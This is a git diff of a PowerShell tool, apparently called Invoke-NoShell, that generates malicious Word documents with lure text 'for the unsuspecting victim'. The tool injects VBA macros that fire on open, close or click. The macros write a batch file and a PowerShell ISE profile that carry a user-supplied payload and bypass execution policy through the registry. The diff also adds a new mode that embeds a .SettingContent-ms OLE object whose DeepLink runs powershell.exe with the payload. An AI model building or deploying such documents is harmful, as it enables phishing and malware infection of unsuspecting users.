@@ -27,11 +27,11 @@ Text to be displayed in the doc for the unsuspecting victim
 Create all 12 possible permutations with the lure text "open sesame" armed with the Powershell script 
 Invoke-NoShell.ps1 -M A -T "Open sesame" -P c:\MyPowershellz\payload.ps1
 
-.EXAMPLE 
+.EXAMPLE
 Create a single document, manually select all the parameters
 Invoke-NoShell.ps1 -M M
 
-.EXAMPLE 
+.EXAMPLE
 Create all 12 possible permutations in the folder C:\MyDocsFolder
 Invoke-NoShell.ps1 -D C:\MyDocsFolder -M A
 
@@ -45,7 +45,8 @@ param (
     [Parameter(Mandatory = $false)][alias("D")][string]$global:docPath = "$env:TEMP\NoShellMacroDoc.doc",
     [Parameter(Mandatory = $false)][alias("P")][string]$global:payloadPath,
     [Parameter(Mandatory = $false)][alias("M")][string]$docGenerationMod,
-    [Parameter(Mandatory = $false)][alias("T")][string]$global:lureText    
+    [Parameter(Mandatory = $false)][alias("T")][string]$global:lureText, 
+    [Parameter(Mandatory = $false)][alias("S")][string]$global:settingContentTempFilename = "$env:TEMP\content.SettingContent-ms"
 )
 
 # Enums and globals
@@ -53,42 +54,52 @@ Enum LaunchTechnique {
     onClick = 0
     onOpen = 1
     onClose = 2
+    embed = 3
 }
 
+# looks a bit ugly here but prints out well due to escape chars
 $NoShellBanner = @"
 
-                       `-:++++++++:-.`
-                `/oymMMMMMMMMMMMMMMMMmho/`
-            `-odMMMMMMMMMmmmmmmmNMMMMMMMMMms-`
-          .omMMMMMMms+:``        `.:oymMMMMMMNs.            
-        .yMMMMMNh/.   ..:://////::-.   .+dMMMMMMy-          
-      .yMMMMMm+`  .+oyyyyyyyyyyyyyyyyo/-  .oNMMMMMy.        
-     +NMMMMMMN+-+yyyyyyso+++yy++++oyyyyyyo:``oNMMMMMo       
-   `yMMMMMMMMMMNdysooy+-----yy-----/ys+syyyy+.`hMMMMMy`
-  `hMMMMN:+NMMMMMNs--os-----oy-----oy:---+yyyy+`oNMMMMd`
-  yMMMMN-`sydNMMMMMNs/y/----+o-----y+-----syyyys-/MMMMMh    
- /MMMMM:.syyy+oNMMMMMNho----+o----+o-----os::syyy/oMMMMMo   
-`mMMMMs`syyy:---sNMMMMMNs---+o----s:----so----syyy/mMMMMN`
-/MMMMM.oyyys:----+dNMMMMMNs-+o---/o----o+-----oyyyyoMMMMM+  
-yMMMMd`yyys+so----:ssNMMMMMNyo---o----o/----/s+syyy+MMMMMh  
-yMMMMd:yyy+--/o/----o:oNMMMMMNs-:+---+/---:o+--/yyy+NMMMMh  
-yMMMMd:yyy/----/+:---+:-oNMMMMMNy:--+:---o+----/yyysmMMMMh  
-yMMMMd.yyys/-----/+---/:--sNMMMMMNs/---/+-----:oyyy+MMMMMh  
-:MMMMM.+syyyyo:----/:--:--:-oNMMMMMNs:/-----+syyyyssMMMMM/  
- dMMMMs `-+yyyys+:---:--------oNMMMMMNs--+syyyyo:``mMMMMm`
- :MMMMM:    .oyyyo--------------oNMMMMMNhyyyo:`   sMMMMM/   
-  oMMMMN-     oyyy----------------oNMMMMMMdy.    /MMMMMs    
-   sMMMMN:    +yyy+----------------:sNMMMMMMo`  oMMMMMy     
-    /MMMMMo   -yyyyyyyyyyyys++oyyyyyyydNMMMMMNohMMMMMo      
-     -mMMMMm/ `yyyyyyyyyyyyyyyyyyyyyyyyydNMMMMMMMMMm-       
-       /mMMMMm/`           .::-`          sMMMMMMM+         
-        `/mMMMMNy+`                    .ohMMMMMm+.          
-           :hNMMMMMdyo:..        `-/ohmMMMMMNh/             
-             `:smMMMMMMMMNNNdmNNNMMMMMMMMms/`
-                 `:oydNMMMMMMMMMMMMNdyo:.                   
+                       ``-:++++++++:-.``
+                ``/oymMMMMMMMMMMMMMMMMmho/``
+            ``-odMMMMMMMMMmmmmmmmNMMMMMMMMMms-``
+          .omMMMMMMms+:````        ``.:oymMMMMMMNs.
+        .yMMMMMNh/.   ..:://////::-.   .+dMMMMMMy-
+      .yMMMMMm+``  .+oyyyyyyyyyyyyyyyyo/-  .oNMMMMMy.
+     +NMMMMMMN+-+yyyyyyso+++yy++++oyyyyyyo:``oNMMMMMo
+   ``yMMMMMMMMMMNdysooy+-----yy-----/ys+syyyy+.```hMMMMMy``
+  ``hMMMMN:+NMMMMMNs--os-----oy-----oy:---+yyyy+``oNMMMMd``
+  yMMMMN-````sydNMMMMMNs/y/----+o-----y+-----syyyys-/MMMMMh
+ /MMMMM:.syyy+oNMMMMMNho----+o----+o-----os::syyy/oMMMMMo
+1``mMMMMs``syyy:---sNMMMMMNs---+o----s:----so----syyy/mMMMMN``
+/MMMMM.oyyys:----+dNMMMMMNs-+o---/o----o+-----oyyyyoMMMMM+
+yMMMMd``yyys+so----:ssNMMMMMNyo---o----o/----/s+syyy+MMMMMh
+yMMMMd:yyy+--/o/----o:oNMMMMMNs-:+---+/---:o+--/yyy+NMMMMh
+yMMMMd:yyy/----/+:---+:-oNMMMMMNy:--+:---o+----/yyysmMMMMh
+yMMMMd.yyys/-----/+---/:--sNMMMMMNs/---/+-----:oyyy+MMMMMh
+:MMMMM.+syyyyo:----/:--:--:-oNMMMMMNs:/-----+syyyyssMMMMM/
+ dMMMMs ``-+yyyys+:---:--------oNMMMMMNs--+syyyyo:````mMMMMm``
+ :MMMMM:    .oyyyo--------------oNMMMMMNhyyyo:``   sMMMMM/
+  oMMMMN-     oyyy----------------oNMMMMMMdy.    /MMMMMs
+   sMMMMN:    +yyy+----------------:sNMMMMMMo``  oMMMMMy
+    /MMMMMo   -yyyyyyyyyyyys++oyyyyyyydNMMMMMNohMMMMMo
+     -mMMMMm/ ``yyyyyyyyyyyyyyyyyyyyyyyyydNMMMMMMMMMm-
+       /mMMMMm/``           .::-``          sMMMMMMM+
+        ``/mMMMMNy+``                    .ohMMMMMm+.
+           :hNMMMMMdyo:..        ``-/ohmMMMMMNh/
+             ``:smMMMMMMMMNNNdmNNNMMMMMMMMms/``
+                 ``:oydNMMMMMMMMMMMMNdyo:.
 "@
 
+# helper for printing an error and terminating
+Function PrintErrorAndTerminate($errMsg) {
+    Write-Error $errMsg
+    Exit
+}
+
+#####################################################################
 # Helpers for setting the reg key enabling interaction with Word
+#####################################################################
 
 # Test if the registry value under key\name exists and equals to the designated value
 Function Test-RegistryValue($regkey, $name, $value) {
@@ -126,12 +137,10 @@ function VerifyVbomKey() {
 
             # VBOM value verification
             If (IsVbomSet) {
-                Write-Output "VBOM registry value was set successfully!"    
-                Return $true
+                PrintErrorAndTerminate "VBOM registry value was set successfully!"    
             }
             Else {
-                Write-Error "Something went wrong while setting the VBOM registry value, terminating..."
-                Exit
+                PrintErrorAndTerminate "Something went wrong while setting the VBOM registry value, terminating..."
             }
         }
         Else {
@@ -139,52 +148,59 @@ function VerifyVbomKey() {
         }
     }
     Else {
-        Write-Error "Something went wrong while testing the existance of VBOM registry key, terminating..."
-        Exit
+        PrintErrorAndTerminate "Something went wrong while testing the existance of VBOM registry key, terminating..."
     }
 
 }
+
+#################################################
+# Helpers for verifying payload won't break VBA
+#################################################
 
 # Verify that the line doesn't exceed the maximal allowed lenght of a VBA line
 function VerifyLineLen($line) {
-    if ($line.length -gt 1024){
-        Write-Error @"
+    if ($line.length -gt 1024) {
+        PrintErrorAndTerminate @"
         One of the payload's lines is too long, VBA tolerates only lines shorter than 1024 chars.
-        Faluting line is:
+        Faulty line is:
         $($line)
 "@
-    Exit
     }
 }
-
-# Helpers for verifying payload won't break VBA
 
 # Verify that no unsupported chars are in the payload
 Function VerifyOnlyAscii($line) {
     # Check if when casted to UTF8 and ASCII string lenght is different
     $ascii = [System.Text.Encoding]::ASCII
     $utf8 = [System.Text.Encoding]::UTF8
-    if ($ascii.GetBytes($line).length -eq $utf8.GetBytes($line).length){
+    if ($ascii.GetBytes($line).length -eq $utf8.GetBytes($line).length) {
         return
     }
-    else{
-        Write-Error @"
+    else {
+        PrintErrorAndTerminate @"
         One of the payload's lines contains non-ASCII char, VBA doesn't support this - consider encoding it in a differnet way.
-        Faluting line is:
+        Faulty line is:
         $($line)
 "@
-        Exit
     }
 }
 
 # Wrapper for all payload-VBA compatibility tests
-Function VerifyVbaLine($line){
+Function VerifyVbaLine($line) {
     VerifyOnlyAscii($line)
     VerifyLineLen ($line)
 }
 
+
+#####################################################################
 # A class which represents a single WinWord-macro-infused document
+#####################################################################
+
 Class MacroDoc {
+    
+    #########################################################
+    # Fields
+    #########################################################
     [Boolean] $isPowershellISE = $false
     [Boolean] $enablePowershell = $false
     [LaunchTechnique] $launchTechnique = 0
@@ -192,8 +208,9 @@ Class MacroDoc {
     [String] $clickTarget = "$env:PUBLIC\batch4ever.bat"
     [String] $payload = ""
 
-
+    #########################################################
     # Static strings which are optional parts of the macro
+    #########################################################
     $hkcuBypassRegKey = @"
 
     'allow execution even where PS is disabled
@@ -210,7 +227,7 @@ Class MacroDoc {
     Dim strCommand As String
     Dim WshShell As Object
     Dim ret As Integer
-    
+
     write_bat
     strCommand = "%PUBLIC%\Batch4ever.bat"
     Set WshShell = CreateObject("WScript.Shell")
@@ -223,47 +240,90 @@ Dim strCommand As String
 write_bat
 "@
 
+    
+    #########################################################
+    # OLE helper functions
+    #########################################################
+
+    CleanUp () {
+        # "DTOR", at the moment remove temporary unnecessary file only when embedding OLE
+        If ($this.launchTechnique -eq 3) {
+            Remove-Item $global:settingContentTempFilename
+        }
+    }
 
 
+    WriteSettingContentToDisk () {
+        $rawPayload = [IO.File]::ReadAllText($global:payloadPath)
+        $settingContentTemplate = @"
+<?xml version="1.0" encoding="UTF-8"?>
+<PCSettings>
+    <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
+    <ApplicationInformation>
+        <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
+                <DeepLink>"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe" -c 
+                $($rawPayload)
+            </DeepLink>
+    </ApplicationInformation>
+    <SettingIdentity>
+        <PageID></PageID>
+        <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
+    </SettingIdentity>
+    <SettingInformation>
+        <Description>@shell32.dll,-4161</Description>
+        <Keywords>@shell32.dll,-4161</Keywords>
+    </SettingInformation>
+    </SearchableContent>
+</PCSettings>
+"@
+        [IO.File]::WriteAllLines($global:settingContentTempFilename, $settingContentTemplate)
+    }
+
+    
+    #########################################################
+    # Core member functuins
+    #########################################################
+    
     DerivDoc() {
         # create the first Word COM object
         Try {
             $word = New-Object -ComObject word.application
             $doc = $word.documents.add()
-        
+
             if ($this.launchTechnique -eq 0) {
                 # add link
                 $range = $doc.Range()
                 $doc.Hyperlinks.Add($range, $this.clickTarget, "" , "", $this.clickText)
             }
-        
+
             # add text
             $selection = $word.selection
             $selection.typeText($global:lureText)
             $selection.typeParagraph()
-        
+
             # saving the doc, last arg is reference to the enum type, doc
             Write-Host $global:docPath
-                
+
             $doc.saveas([ref] $global:docPath, [ref] 0)
             $word.quit()
-        
+
+            $word = New-Object -ComObject Word.Application
+
             # add macro, for some odd reason I needed to open it after it is saved, otherwise it did not work
-            $Word = New-Object -ComObject Word.Application
-            $Doc = $Word.Documents.Open($global:docPath)
-            $Doc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString($this.payload)
-                
+            $doc = $Word.Documents.Open($global:docPath)
+            $doc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString($this.payload)
+
             # If we close the document and macro is set to run OnClose that's going to be a problem! So...
             If ($this.launchTechnique -eq 2) {
                 0
                 $doc.saveas([ref] $global:docPath, [ref] 0)
                 # Forecefully stop WinWord
-                Stop-Process -Name WINWORD        
+                Stop-Process -Name WINWORD
             }
             else {
                 # Nothing will happen on close, we can be good boys and close it nicely
                 $Doc.close()
-                $Word.quit()    
+                $Word.quit()
             }
         }
         Catch {
@@ -271,9 +331,37 @@ write_bat
         } 
     }
 
+    # Derive the current class into an instance of a document with an OLE
+    # We assume that launch technique == 3
+    DerivOleDoc() {
+        # create the first Word COM object
+        Try {
+            $word = New-Object -ComObject word.application
+            $doc = $word.documents.add()
 
+            # add text
+            $selection = $word.selection
+            
+            # Embed the payload in the document's body
+            $selection.InlineShapes.AddOLEObject("", $global:settingContentTempFilename)
+            $selection.typeParagraph()
+            $selection.typeText($global:lureText)
+            $selection.typeParagraph()
 
-    # Constructor for creating the documents automatically
+            # saving the doc, last arg is reference to the enum type, doc
+            Write-Host $global:docPath
+
+            $doc.saveas([ref] $global:docPath, [ref] 0)
+            $word.quit()
+
+            $word = New-Object -ComObject Word.Application
+        }
+        Catch {
+            Write-Host $PSItem.Exception.Message
+        } 
+    }
+
+    # CTOR for creating the documents automatically
     MacroDoc(
         [Boolean] $isPowershellISE,
         [Boolean] $enablePowershell,
@@ -287,61 +375,50 @@ write_bat
         $macroFiresOn = "Open"
         $batchOrPowershellLauncher = ""
         $iseSelfTerminate = ""
-        
-        #Select when to fire the payload
-        while ($true) {
+
+        # Macro flow for launc techniques 0,1,2 and embedded payload flow for technique 3
+        If (-Not ($this.launchTechnique -eq 3)) {
+            # Select when to fire the payload
             If (($this.launchTechnique -eq 0) -or ($this.launchTechnique -eq 1)) {
                 # OnOpen or OnClick since you need to prepare something to be behind the click
                 $macroFiresOn = "Open"
-                break
             }
             ElseIf ($this.launchTechnique -eq 2) {
                 # otherwise OnClose
                 $macroFiresOn = "Close"
-                break
             }
-
             Else {
-                Write-Error "Illegal selection, please retry"
+                PrintErrorAndTerminate "Illegal launcher selection, terminating..."
             }
-        }
 
-        # Set the grounds for either Powershell or ISE hosts to bypass execution policy
-        while ($true) {
+            # Set the grounds for either Powershell or ISE hosts to bypass execution policy
             If ($enablePowershell) {
                 # Use a neat trick to allow Powrshell execution via the HKCU registry
                 $placeholderForOptionalenablePowershell = $this.hkcuBypassRegKey
                 # simply add -ep bypass to the command executing the payload, if Powershell will be called directly
                 $epBypass = "-ep bypass "
-                break
             }
-
             ElseIf (-Not ($enablePowershell)) {
                 # Placeholders already set to be empty.
-                break
             }
-
             Else {
-                Write-Error "Illegal selection, please retry"
+                PrintErrorAndTerminate "Illegal host selection, terminating..."
             }
-        }
 
-        # Choose whether you want to launch Powershell directly which is less stealth, or do you wish to abuse PowershellISE
-        while ($true) {
+            # Choose whether you want to launch Powershell directly which is less stealth, or do you wish to abuse PowershellISE
             If (-Not ($isPowershellISE)) {
                 # Compose the beginning for the Powershell case
                 # Cuurently only on open\close is implemented
                 # TODO: add support to on click
                 $batchOrPowershellLauncher = @"
-    Dim strCommand As String
-    Dim WshShell As Object
-    Dim ret As Integer
+Dim strCommand As String
+Dim WshShell As Object
+Dim ret As Integer
 
-    strCommand = "Powershell $($epBypass)-File ""%USERPROFILE%\Documents\WindowsPowerShell\Microsoft.PowerShellISE_profile.ps1"""
-    Set WshShell = CreateObject("WScript.Shell")
-    ret = WshShell.Run(strCommand, 0, True)
+strCommand = "Powershell $($epBypass)-File ""%USERPROFILE%\Documents\WindowsPowerShell\Microsoft.PowerShellISE_profile.ps1"""
+Set WshShell = CreateObject("WScript.Shell")
+ret = WshShell.Run(strCommand, 0, True)
 "@
-                break
             }
 
             ElseIf ($isPowershellISE) {
@@ -350,21 +427,18 @@ write_bat
                 If (($this.launchTechnique -eq 1) -or ($this.launchTechnique -eq 2)) {
                     # ISE case, execute on Open\Close
                     $batchOrPowershellLauncher = $this.batchLauncher
-                    break
                 }
                 Else {
                     # ISE case, execute on Click
                     $batchOrPowershellLauncher = $this.batchWriter
-                    break
                 }
             }
             Else {
-                Write-Error "Illegal selection, please retry"
+                PrintErrorAndTerminate "Illegal host selection, terminating..."
             }
-        }
 
-        # TODO: redundantly writes this function although not invoked on the case Powershell is selected as a host
-        $writeBatFunc = @"
+            # TODO: redundantly writes this function although not invoked on the case Powershell is selected as a host
+            $writeBatFunc = @"
 'write a batch file which PowerShell execution without administrator privileges.
 'following that, it will be launching PowerShell ISE to run our payload
 'in this version of the document the batch is executed on click
@@ -379,7 +453,7 @@ Function write_bat()
 End Function
 "@
 
-        $writePsFunc = @"
+            $writePsFunc = @"
 'writes the PowerShell script to the disk
 'it will be loaded automatically when PowerShell ISE is started
 Function write_ps()
@@ -400,9 +474,8 @@ Function write_ps()
 End Function
 "@
 
-
-        # This is the final macro, compose anything we've done so far here 
-        $this.payload = @"
+            # This is the final macro, compose anything we've done so far here 
+            $this.payload = @"
 Option Explicit
 
 'this will set our devious plan in motion
@@ -416,8 +489,20 @@ $($writePsFunc)
 $($writeBatFunc)
 
 "@
-       
-        $this.DerivDoc() 
+            $this.DerivDoc()
+        
+        }
+
+        ElseIf ($this.launchTechnique -eq 3) {
+            $this.WriteSettingContentToDisk()
+            $this.DerivOleDoc()
+        }
+
+        Else {
+            PrintErrorAndTerminate "Unknown launch technique selected, terminating..."
+        }
+
+        $this.CleanUp()
     }
 
     # Constructor for creating a single document manually
@@ -426,10 +511,16 @@ $($writeBatFunc)
         $usePowershellIse = $false
         $epBypass = $false
         [LaunchTechnique] $launch = 0
-        
-        #Select when to fire the payload
+
+        # Select when to fire the payload
         while ($true) {
-            $launch = Read-Host -Prompt "Please select when to launch the payload:`n[0] - On click`n[1] - On document open`n[2] - On document close"
+            $launch = Read-Host -Prompt @"
+Please select when to launch the payload:
+[0] - On click
+[1] - On document open
+[2] - On document close
+[3] - Embed payload
+"@
             If (($launch -eq 0) -or ($launch -eq 1)) {
                 # OnOpen or OnClick since you need to prepare something to be behind the click
                 If ($launch -eq 0) {
@@ -437,13 +528,17 @@ $($writeBatFunc)
                 }
                 break
             }
-            ElseIf ($launch -eq 2) {
-                # otherwise OnClose
+            ElseIf (($launch -eq 2) -or ($launch -eq 3)) {
                 break
             }
             Else {
                 Write-Error "Illegal selection, please retry"
             }
+        }
+
+        If ($launch -eq 3) {
+            New-Object MacroDoc($usePowershellIse, $epBypass, $launch)
+            Exit
         }
 
         # Set the grounds for either Powershell or ISE hosts to bypass execution policy
@@ -494,35 +589,34 @@ Write-Host $NoShellBanner
 
 # Verify mandatory registry key is set
 If ( -Not (VerifyVbomKey) ) {
-    Write-Error "Can't set VBOM registry value, terminating..."
-    Exit
+    PrintErrorAndTerminate "Can't set VBOM registry value, terminating..."
 }
 
 # Get payload path if wasn't supplied as argument
 While ($true) {
     Try {
-        if (-Not ($payloadPath)) {
-            $payloadPath = Read-Host -Prompt "Please insert a path with the payload you wish to embed"
+        if (-Not ($global:payloadPath)) {
+            $global:payloadPath = Read-Host -Prompt "Please insert a path with the payload you wish to embed"
         }
         # Parse and prepare the payload to be transplanted into the macro
         $global:payloadInLines = @"
 stream.WriteLine "" `r`n
 "@
-        $payload = [IO.File]::ReadAllText($payloadPath)
+        $payload = [IO.File]::ReadAllText($global:payloadPath)
 
         ForEach ($line in $($payload -split "`r`n")) {
             $line = $line.Replace("""", """""")
             $lineToWrite = "stream.WriteLine """ + $line + """`r`n"
             VerifyVbaLine $lineToWrite
-            $payloadInLines = $payloadInLines + $lineToWrite
+            $global:payloadInLines = $global:payloadInLines + $lineToWrite
         }
-        $global:payloadInLines = $payloadInLines
         # If we are here - there were no errors and we can break the loop
         break
     }
     Catch {
         Write-Error "There's something wrong with the supplied path, please enter a new one"
-        $payloadPath = ""
+        # erasing the bad value to allow the loop to restart correctly
+        $global:payloadPath = ""
     }
 }
 if (-Not ($global:lureText)) {
@@ -534,7 +628,7 @@ while ($true) {
     if (-Not ($docGenerationMod)) {
         $docGenerationMod = Read-Host -Prompt "Please select manual or auto mode:
 [A] - Auto mode, will generate all possible permutations
-[M] - Manual mode, carefully select options to apply on a single document"        
+[M] - Manual mode, carefully select options to apply on a single document"
     }
     If ($docGenerationMod -eq "A") {
         # Create output folder
@@ -544,21 +638,33 @@ while ($true) {
         $trueFalseArray = @($true, $false)
         $enumIndices = @(0, 1, 2)
 
+
+        # Calling CTOR with dummy values for embedded payload
+        # TODO: consider creating another CTOR or changing the overloading
+        $global:docPath = $OutDir + "\MacroDoc3.doc"
+        New-Object MacroDoc($false, $false, 3)
+
+
         foreach ($psOrISE in $trueFalseArray) {
             foreach ($doBypass in $trueFalseArray) {
                 foreach ($fireMacroSelector in $enumIndices) {
                     # For each possible selection create a macro document and name it uniqly
                     $global:docPath = $OutDir + "\MacroDoc" + $psOrISE.ToString() + $doBypass.ToString() + $fireMacroSelector.ToString() + ".doc"
-                    # Output is sent to Out-Null since it prints the entire macro and spams the terminal
-                    New-Object MacroDoc($psOrISE, $doBypass, $fireMacroSelector) | Out-Null
-                }           
-            }          
+                    New-Object MacroDoc($psOrISE, $doBypass, $fireMacroSelector)
+                }
+            }
         }
+        
+        # Calling CTOR with dummy valse for embedded payload 
+        # TODO: consider creating another CTOR or changing the overloading
+        $global:docPath = $OutDir + "\MacroDoc3.doc"
+        New-Object MacroDoc($false, $false, 3)
+        
         break
     }
     ElseIf ($docGenerationMod -eq "M") {
         # manual mode, get user inputs
-        New-Object MacroDoc 
+        New-Object MacroDoc
         break
     }
     Else {
